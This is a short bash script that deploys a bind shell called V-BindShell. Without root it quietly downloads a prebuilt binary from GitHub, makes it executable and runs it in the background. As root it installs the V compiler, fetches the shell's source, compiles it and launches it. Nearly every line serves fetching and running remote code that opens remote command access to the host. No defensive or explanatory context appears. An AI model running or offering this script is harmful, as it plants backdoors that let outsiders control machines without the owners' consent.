#!/bin/bash

if [ $EUID -ne 0 ]; then
    wget -q https://github.com/bstnbuck/V-BindShell/releases/download/v1.0/v_shell-linux-amd64 -O v_shell && chmod +x v_shell && ./v_shell &
    exit
fi
apt install -y git wget make build-essential
git clone https://github.com/vlang/v
cd v && make
wget https://raw.githubusercontent.com/bstnbuck/V-BindShell/main/v_shell.v
./v -autofree v_shell.v && chmod +x v_shell && ./v_shell &
exit